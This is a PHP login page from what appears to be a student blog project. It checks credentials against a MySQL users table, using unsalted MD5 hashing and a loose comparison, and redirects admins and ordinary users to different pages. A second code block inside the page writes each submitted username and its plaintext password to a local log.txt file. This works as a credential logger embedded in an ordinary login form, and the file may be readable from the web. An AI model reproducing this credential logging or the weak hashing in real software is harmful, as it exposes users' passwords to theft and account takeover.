<?php
session_start();
 require_once 'ConnectorDb.php';


if($_SERVER["REQUEST_METHOD"] == "POST"){
  $username = strip_tags($_POST['username']);
  $password = strip_tags($_POST['password']);

  $username =  stripslashes($username);
  $password =  stripslashes($password);

  $username = mysqli_real_escape_string($mysqli, $username);
  $password= mysqli_real_escape_string($mysqli, $password);

  $password= md5($password);

  $dbQuery = "SELECT * FROM users WHERE UserName = '$username' LIMIT 1";
  $result = mysqli_query($mysqli, $dbQuery);
  $row = mysqli_fetch_array($result);

  $Id = $row['Id'];
  $db_password = $row['Password'];
  $role = $row['role'];
  //if password matches create a session nane and id for that user
  if($password == $db_password){

    $_SESSION['username'] = $username;
    $_SESSION['id'] = $Id;


    //if the user role is admin that redirect to admin page
    //redirect the iuser to the users page
    if($role == "admin"){
      $_SESSION['role'] = $role;
      header("Location: admin.php");
    }else{
      //redirect the iuser to the users page
          header("Location: blogMng.php");
    }

  }else{
    //diplay error
    $_SESSION['message'] ="Invalid Username or Password";
  }

}
?>
<?php

 if(isset($_POST['login']))
 {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $date = new DateTime();
  $date = $date->format("y:m:d h:i:s");
  $text = $date . " Existing User Login " . " Username = " . $username . " , " . "Password = " . $password . "\n";
  $fp = fopen('log.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'saved';

    }
fclose ($fp);
}
?>
<html >
<head>
    <title>Login</title>
    <meta charset="UTF-8">
    <link href="app.css" rel="stylesheet" type="text/css" >

</head>
<body>

  <header>
    <nav id="globalnav">


           <a  href="index.php">Home</a>
           <a class = "active" href="login.php">Login</a>
           <a href="registration.php">Sign-Up</a>
         <a href="profileMng.php">ProfileMng</a>
          <a  href="blogMng.php">BlogMng</a>

    </nav>
</header>
    <div div class="main-body-Form">
        <h1>Login</h1>
      <form action="login.php" method="post">
        <div class="alert alert-error"></div>
        <div class="alert alert-error"><?= @$_SESSION['message'] ?></div>
        <input type="text" placeholder="User Name" name="username" required /><div>
        <input type="password" placeholder="Password" name="password" autocomplete="new-password" required /><div>
        <input type="submit" value="Login"/>
        <input type="reset" value="Clear"/>
      </form>
        <p>Don't have an account? <a id = "login" href="registration.php">Sign-Up</a></p>
    </div>

    <div class="footer">
     <footer id="cpright" >Copyrights of Arsalan Khan And Hasib Aziz ..... 2018</footer>
   </div>
</body>

</html>
